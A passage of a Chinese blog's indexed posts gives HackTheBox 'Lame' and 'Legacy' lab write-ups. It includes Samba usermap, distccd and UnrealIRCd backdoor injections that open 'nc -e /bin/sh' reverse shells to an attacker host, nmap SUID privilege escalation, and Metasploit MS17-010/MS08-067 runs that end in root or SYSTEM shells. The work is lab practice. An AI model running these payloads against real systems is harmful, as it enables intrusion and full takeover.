Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds 该漏洞不存在，转向ssh和smb ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:4:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"2.ssh 试着爆破一下，没发现可以利用的点。 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:5:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"3.SMB ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"MSF msf6 \u003e search samba msf6 \u003e use exploit/multi/samba/usermap_script [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(multi/samba/usermap_script) \u003e set rhosts 10.10.10.3 rhosts =\u003e 10.10.10.3 msf6 exploit(multi/samba/usermap_script) \u003e set lhost 10.10.14.2 lhost =\u003e 10.10.14.2 msf6 exploit(multi/samba/usermap_script) \u003e run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] Command shell session 1 opened (10.10.14.2:4444 -\u003e 10.10.10.3:32875 ) at 2022-03-16 16:04:23 +0800 whoami root find / -name \"user.txt\" /home/makis/user.txt cat /home/makis/user.txt 83bb7c7fff163562d48ac4ba14316025 cat /root/root.txt 848a15387ca22dcf38b1cdc8538223a0 不用MSF怎么解决呢？ 试试nmap的nse漏洞脚本，无果 $ sudo nmap --script smb-vuln* -p139,445 10.10.10.3 -T4 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 16:38 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: false |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug) Nmap done: 1 IP address (1 host up) scanned in 175.81 seconds ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:1","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"非MSF 信息搜集，寻找历史漏洞 确定Samba具体版本 $ smbclient -L 10.10.10.3 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED ┌──(xavier㉿xavier)-[~] └─$ smbclient -L 10.10.10.3 -U \"\" -N --option='client min protocol=nt1' Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME 关于smbclient出现NT_STATUS_CONNECTION_DISCONNECTED错误 smbclient从4.11开始协议取消了nt1,使用smbv2,所以导致协议不能协商,解决办法如上，通过option指定，也可以修改配置文件 /etc/samba/smb.conf crackmapexec 探测 $ crackmapexec smb --shares 10.10.10.3 -u '' -p '' [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing MSSQL protocol database [*] Initializing SMB protocol database [*] Initializing LDAP protocol database [*] Initializing WINRM protocol database [*] Initializing SSH protocol database [*] Copying default configuration file [*] Generating SSL certificate SMB 10.10.10.3 445 LAME [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True) SMB 10.10.10.3 445 LAME [+] hackthebox.gr\\: SMB 10.10.10.3 445 LAME [+] Enumerated shares SMB 10.10.10.3 445 LAME Share Permissions Remark SMB 10.10.10.3 445 LAME ----- ----------- ------ SMB 10.10.10.3 445 LAME print$ Printer Drivers SMB 10.10.10.3 445 LAME tmp READ,WRITE oh noes! SMB 10.10.10.3 445 LAME opt SMB 10.10.10.3 445 LAME IPC$ IPC Service (lame server (Samba 3.0.20-Debian)) SMB 10.10.10.3 445 LAME ADMIN$ IPC Service (lame server (Samba 3.0.20-Debian)) 确定Samba 版本为 3.0.20，就可以找相应的漏洞。 $ searchsploit samba 3.0.20 $ searchsploit samba 3.0.20 ------------------------------------------------------------------------------------------------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------- Samba 3.0.10 \u003c 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 \u003c 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb Samba \u003c 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u003c 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u003c 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py ------------------------------------------------------------------------------------------------------------------------- Shellcodes: No Results $ more /usr/share/exploitdb/exploits/unix/remote/16320.rb ...... 'Author' =\u003e [ 'jduck' ], 'License' =\u003e MSF_LICENSE, 'Version' =\u003e '$Revision: 10040 $', 'References' =\u003e [ [ 'CVE', '2007-2447' ], [ 'OSVDB', '34700' ], [ 'BID', '23972' ], [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ], [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ] ], 'Platform' =\u003e ['unix'], 看到CVE编号：2007-2447 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:2","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"Github Github找利用脚本 随便找了一个，https://github.com/amriunix/CVE-2007-2447，安装依赖$ pip install pysmb，按照说明运行： $ python3 usermap_script.py [*] CVE-2007-2447 - Samba usermap script [-] usage: python usermap_script.py \u003cRHOST\u003e \u003cRPORT\u003e \u003cLHOST\u003e \u003cLPORT\u003e $ nc -l -v -p 4444 $ python3 usermap_script.py 10.10.10.3 139 10.10.14.2 4444 [*] CVE-2007-2447 - Samba usermap script [+] Connecting ! [+] Payload was sent - check netcat ! $ nc -l -v -p 4444 listening on [any] 4444 ... 10.10.10.3: inverse host lookup failed: Unknown host connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 36956 whoami root whereis python python: /usr/bin/python2.5-config /usr/bin/python /usr/bin/python2.5 /etc/python /etc/python2.5 /usr/lib/python2.3 /usr/lib/python2.5 /usr/lib/python2.4 /usr/local/lib/python2.5 /usr/include/python2.5 /usr/share/python /usr/share/man/man1/python.1.gz python -c 'import pty;pty.spawn(\"/bin/bash\")' root@lame:/# find / -name user.txt find / -name user.txt /home/makis/user.txt root@lame:/# cat /home/makis/user.txt cat /home/makis/user.txt 83bb7c7fff163562d48ac4ba14316025 root@lame:/# cat /root/root.txt cat /root/root.txt 848a15387ca22dcf38b1cdc8538223a0 root@lame:/# ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:3","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"crackmapexec 来自参考文献2 more /usr/share/exploitdb/exploits/unix/remote/16320.rb 分析漏洞利用脚本，发现name 字段为 \"/=`nohup \" + payload.encoded + \"`\" $ crackmapexec smb --shares 10.10.10.3 -u './=`nohup nc -e /bin/sh 10.10.14.2 4445`' -p '' SMB 10.10.10.3 445 LAME [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True) 另一边做监听$ nc -lvnp 4445 $ nc -lvnp 4445 listening on [any] 4445 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 59300 whoami root Metasploit 使用 nohup 命令，即 no hang up的缩写，这是 Linux 系统中的一个命令，即使在退出 shell 或终端并在当前上下文之外启动进程然后是有效负载之后，它也能保持进程运行。 总结：Lame 是利用Samba的命令注入漏洞直接获取root权限 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:4","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"4. distccd 看了参考文献2后，才发现还少了一个点没有发现，这边我不写了，直接看原文吧。 想了想还是再从这个点再做一次，多练习练习。 nmap 默认扫描未发现该端口，需要进行全端口才可以。这里用masscan快速扫描 $ sudo masscan -e tun0 -p- --max-rate 500 10.10.10.3 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-17 05:45:11 GMT Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 139/tcp on 10.10.10.3 Discovered open port 22/tcp on 10.10.10.3 Discovered open port 445/tcp on 10.10.10.3 Discovered open port 3632/tcp on 10.10.10.3 Discovered open port 21/tcp on 10.10.10.3 nmap 做细分扫描，扫特定端口的服务详情，并用上NSE $ sudo nmap -T4 -sSV -sC -p3632 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 13:52 HKT Nmap scan report for 10.10.10.3 Host is up (0.29s latency). PORT STATE SERVICE VERSION 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds $ locate *.nse | grep distcc /usr/share/nmap/scripts/distcc-cve2004-2687.nse $ sudo nmap -T4 --script distcc* -p3632 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 13:57 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE 3632/tcp open distccd | distcc-cve2004-2687: | VULNERABLE: | distcc Daemon Command Execution | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2004-2687 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Allows executing of arbitrary commands on systems running distccd 3.1 and | earlier. The vulnerability is the consequence of weak service configuration. | | Disclosure date: 2002-02-01 | Extra information: | | uid=1(daemon) gid=1(daemon) groups=1(daemon) | | References: | https://nvd.nist.gov/vuln/detail/CVE-2004-2687 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 |_ https://distcc.github.io/security.html Nmap done: 1 IP address (1 host up) scanned in 2.88 seconds 网上查distccd的资料： distccd is the server for the distcc(1) distributed compiler. It accepts and runs compilation jobs for network clients. more /usr/share/nmap/scripts/distcc-cve2004-2687.nse查看NSE脚本的具体内容： $ more /usr/share/nmap/scripts/distcc-cve2004-2687.nse ..... description = [[ Detects and exploits a remote code execution vulnerability in the distributed compiler daemon distcc. The vulnerability was disclosed in 2002, but is still present in modern implementation due to poor configuration of the service. ]] --- -- @usage -- nmap -p 3632 \u003cip\u003e --script distcc-exec --script-args=\"distcc-exec.cmd='id'\" ... 可以看到distcc-exec.cmd参数即为所执行的命令，将其改为连接命令，如nc -e /bin/bash 10.10.14.2 4444， 用nmap -p 3632 \u003cip\u003e --script distcc-exec --script-args=\"distcc-exec.cmd='id'\"这种方法出现了很多意料之外的问题，无法成功获得shell。排查中… NSE: failed to initialize the script engine: /usr/bin/../share/nmap/nse_main.lua:822: 'distcc-exec' did not match a category, filename, or directory stack traceback: [C]: in function 'error' /usr/bin/../share/nmap/nse_main.lua:822: in local 'get_chosen_scripts' /usr/bin/../share/nmap/nse_main.lua:1322: in main chunk [C]: in ? QUITTING! 排查结果出来了，虽然用法中写着distcc-exec，但nmap其实并无法识别，只能用全名，对应的后面也需要修改。改成如下后，可成功执行 $ sudo nmap -p3632 10.10.10.3 --script=distcc-cve2004-2687.nse --script-args=\"distcc-cve2004-2687.cmd='nc -e /bin/bash 10.10.14.2 4444'\" $ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 42558 成功获得了daemon 权限，接下去进行提权 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"提权1：SUID - nmap └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 42558 whoami daemon python -c \"import pty;pty.spawn('/bin/bash')\" daemon@lame:/tmp$ find / -type f -perm -u=s 2\u003e/dev/null find / -type f -perm -u=s 2\u003e/dev/null /bin/umount /bin/fusermount /bin/su /bin/mount /bin/ping /bin/ping6 /sbin/mount.nfs /lib/dhcp3-client/call-dhclient-script /usr/bin/sudoedit /usr/bin/X /usr/bin/netkit-rsh /usr/bin/gpasswd /usr/bin/traceroute6.iputils /usr/bin/sudo /usr/bin/netkit-rlogin /usr/bin/arping /usr/bin/at /usr/bin/newgrp /usr/bin/chfn /usr/bin/nmap /usr/bin/chsh /usr/bin/netkit-rcp /usr/bin/passwd /usr/bin/mtr /usr/sbin/uuidd /usr/sbin/pppd /usr/lib/telnetlogin /usr/lib/apache2/suexec /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/pt_chown /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper daemon@lame:/tmp$ nmap --version nmap --version Nmap version 4.53 ( http://insecure.org ) 发现有nmap，版本为4.53，可以利用进行提权 nmap 在 2.02 到 5.21 版本中可用交互模式（–interactive）执行 shell 命令 The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands. daemon@lame:/tmp$ nmap --interactive nmap --interactive Starting Nmap V. 4.53 ( http://insecure.org ) Welcome to Interactive Mode -- press h \u003center\u003e for help nmap\u003e !sh !sh sh-3.2# whoami whoami root sh-3.2# cat /root/root.txt cat /root/root.txt 29ad7975c49f5ccb49b735a93efbfc4e ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:1","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"提权2：ssh key daemon@lame:/tmp$ cat /root/.ssh/authorized_keys cat /root/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable 看到msfadmin@metasploitable，最初以为是其他攻击方式留下的，重置主机后发现还是存在，说明是个线索，但是我不知道是什么。参考文章2告诉我是 CVE-2008-0166 的线索，没了解过，$ searchsploit cve-2008-0166 无过，上网搜。 OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys. ——https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166 翻译：基于 Debian 的操作系统上的 OpenSSL 0.9.8c-1 到 0.9.8g-9 之前的版本使用随机数生成器生成可预测的数字，这使得远程攻击者更容易对加密密钥进行暴力猜测攻击。 expdb搜索：https://www.exploit-db.com/search?cve=2008-0166 看了一个利用脚本，描述步骤如下： # https://www.exploit-db.com/exploits/5720 # Autor: hitz - WarCat team (warcat.no-ip.org) # Collaborator: pretoriano # # 1. Download https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2) # # 2. Extract it to a directory # # 3. Execute the python script # - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5 # - execute: python exploit.py (without parameters) to display the help # - if the key is found, the script shows something like that: # Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121 # Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240 ############################################################################ 因为网络问题没法下载5622.tar.bz2，这边先略过，可见参考文章2：privesc2部分 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:2","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"提权3 : UnrealIRCd Backdoored 推测由于网络问题，netstat -nltp 数据没能回显过来，从结果中发现6697端口，马上想到 IRC。 ps auxww | grep -i unreal 查看unrealIRC进程，发现 UnrealIRCd 以root权限运行。 ps auxww | grep -i unreal root 5612 0.0 0.4 8540 2488 ? S 01:43 0:00 /usr/bin/unrealircd root 6522 0.0 0.1 1784 548 ? R 06:01 0:00 grep -i unreal 根据这篇文章 unrealircd-3281-backdoored ，我们可以利用此服务来创建后门并拿到root权限 按照参考文章2，做一遍 aemon@lame:/tmp$ nc 127.0.0.1 6697 nc 127.0.0.1 6697 :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname... :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead ERROR :Closing Link: [127.0.0.1] (Ping timeout) 得到 Metasploitable 的输出，这表明我们在正确的方向。为了方便使用后门，我们可以使用已知的connect-back shell方法。 daemon@lame:/tmp$ echo \"AB; nc -e /bin/sh 10.10.14.2 5555\" | nc 127.0.0.1 6697 echo \"AB; nc -e /bin/sh 10.10.14.2 5555\" | nc 127.0.0.1 6697 :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname... :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead 另一边 └─$ nc -lvnp 5555 listening on [any] 5555 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 39370 whoami root cat /root/root.txt 29ad7975c49f5ccb49b735a93efbfc4e 测试发现IRC的6667和6697端口都可以。 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:3","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"他山之石 https://hackpentest.in/hackthebox-lame/ 使用了python获取一个完整的tty SHELL python -c 'import pty;pty.spawn(\"/bin/bash\")'，同时提供了非MSF思路。 https://coldfusionx.github.io/posts/LameHTB/ 使用了crackmapexec ， 根据现有exp自己复现了利用代码；distccd的攻击思路、提权思路 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:8:0","tags":["HTB","OSCP"],"title":"HTB靶机 Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["靶场"],"content":"备战OSCP系列，从HackTheBox靶场开始。","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["靶场"],"content":"备战OSCP系列，从HackTheBox靶场开始。 ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:0:0","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["靶场"],"content":"Legacy 用户评分2.5分，Tags：Injection 顺便说一句，这个跟oscp lab里的某靶机几乎一模一样。。 考点：SMB漏洞 ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:1:0","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["靶场"],"content":"WriteUp ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:0","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["靶场"],"content":"0.SCAN nmap扫描服务，需要用-Pn $ nmap -F 10.10.10.4 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 12:58 HKT Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.07 seconds $ nmap -Pn -T4 10.10.10.4 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 13:01 HKT Nmap scan report for 10.10.10.4 Host is up (0.24s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp closed ms-wbt-server 使用-sC 后结果如下： Host script results: |_clock-skew: mean: 5d01h01m43s, deviation: 1h24m50s, median: 5d00h01m43s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 40600/tcp): CLEAN (Timeout) | Check 2 (port 62576/tcp): CLEAN (Timeout) | Check 3 (port 50902/udp): CLEAN (Timeout) | Check 4 (port 36848/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-03-20T09:07:28+02:00 |_smb2-time: Protocol negotiation failed (SMB2) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: 00:50:56:b9:8c:eb (VMware) 使用 –script vuln 快速查找相应漏洞，结果如下： PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp closed ms-wbt-server Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED 可利用：ms08-067,ms17-010 ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:1","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["靶场"],"content":"1.ms17-010 使用MSF，查找相应漏洞利用模块 $ msfconsole msf6 \u003e search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce msf6 \u003e use exploit/windows/smb/ms17_010_psexec [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_psexec) \u003e set rhosts 10.10.10.4 rhosts =\u003e 10.10.10.4 msf6 exploit(windows/smb/ms17_010_psexec) \u003e set lhost 10.10.14.2 lhost =\u003e 10.10.14.2 msf6 exploit(windows/smb/ms17_010_psexec) \u003e run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] 10.10.10.4:445 - Target OS: Windows 5.1 [*] 10.10.10.4:445 - Filling barrel with fish... done [*] 10.10.10.4:445 - \u003c---------------- | Entering Danger Zone | ----------------\u003e [*] 10.10.10.4:445 - [*] Preparing dynamite... [*] 10.10.10.4:445 - [*] Trying stick 1 (x86)...Boom! [*] 10.10.10.4:445 - [+] Successfully Leaked Transaction! [*] 10.10.10.4:445 - [+] Successfully caught Fish-in-a-barrel [*] 10.10.10.4:445 - \u003c---------------- | Leaving Danger Zone | ----------------\u003e [*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e77660 [*] 10.10.10.4:445 - Built a write-what-where primitive... [+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained! [*] 10.10.10.4:445 - Selecting native target [*] 10.10.10.4:445 - Uploading payload... CUwrRlZx.exe [*] 10.10.10.4:445 - Created \\CUwrRlZx.exe... [+] 10.10.10.4:445 - Service started successfully... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] 10.10.10.4:445 - Deleting \\CUwrRlZx.exe... [*] Meterpreter session 1 opened (10.10.14.2:4444 -\u003e 10.10.10.4:1031 ) at 2022-03-1513:52:36 +0800 meterpreter \u003e meterpreter \u003e getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u003e shell cd C:\\Documents and Settings\\john\\Desktop C:\\Documents and Settings\\john\\Desktop\u003emore user.txt more user.txt e69af0e4f443de7e36876fda4ec7644f cd C:\\Documents and Settings\\Administrator\\Desktop C:\\Documents and Settings\\Administrator\\Desktop\u003emore root.txt more root.txt 993442d258b0e0ec917cae9e695d5713 # shell 进去太笨重了 meterpreter \u003e search -f user.txt Found 1 result... ================= Path Size (bytes) Modified (UTC) ---- ------------ -------------- c:\\Documents and Settings\\john\\Desktop\\user.txt 32 2017-03-16 14:19:49 +0800 meterpreter \u003e cat \"c:\\Documents and Settings\\john\\Desktop\\user.txt\" e69af0e4f443de7e36876fda4ec7644 meterpreter \u003e search -f root.txt Found 1 result... ================= Path Size (bytes) Modified (UTC) ---- ------------ -------------- c:\\Documents and Settings\\Administrator\\Desktop\\root.txt 32 2017-03-1614:18:50 +0800 meterpreter \u003e cat \"c:\\Documents and Settings\\Administrator\\Desktop\\root.txt\" 993442d258b0e0ec917cae9e695d5713 serach -f 文件名查找文件路径 Kali /usr/share/windows-binaries目录下自带一些Windows下命令 ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:2","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["靶场"],"content":"2.ms08-067 msf6 exploit(windows/smb/ms17_010_psexec) \u003e use windows/smb/ms08_067_netapi msf6 exploit(windows/smb/ms08_067_netapi) \u003e set rhosts 10.10.10.4 rhosts =\u003e 10.10.10.4 msf6 exploit(windows/smb/ms08_067_netapi) \u003e set lhost 10.10.14.2 lhost =\u003e 10.10.14.2 msf6 exploit(windows/smb/ms08_067_netapi) \u003e run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] 10.10.10.4:445 - Automatically detecting the target... [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] 10.10.10.4:445 - Attempting to trigger the vulnerability... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] Meterpreter session 2 opened (10.10.14.2:4444 -\u003e 10.10.10.4:1032 ) at 2022-03-15 14:42:38 +0800 meterpreter \u003e meterpreter \u003e upload /usr/share/windows-binaries/whoami.exe meterpreter \u003e shell C:\\WINDOWS\\system32\u003ewhoami whoami NT AUTHORITY\\SYSTEM ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:3","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["靶场"],"content":"他山之玉 Hackthebox walkthrough - Legacy（考点:smb利用 blue）：使用了另一个exp工具：AutoBlue-MS17-010，提到了WindowsXP系统没有whoami的问题。 HackTheBox — Legacy Writeup：使用了MS08-067（python脚本）和MS07-010（python脚本+MSF），提到了/usr/share/windows-binaries/ 在OSCP的进攻方认证考试中只允许对一台主机用msf，所以在测试的时候尽量避免用msf（直接用msf很low） ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:3:0","tags":["HTB","OSCP"],"title":"HTB靶机 Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["Pentest"],"content":"本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil、bitsadmin、Xcopy，都是些老技术，整理分享。","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 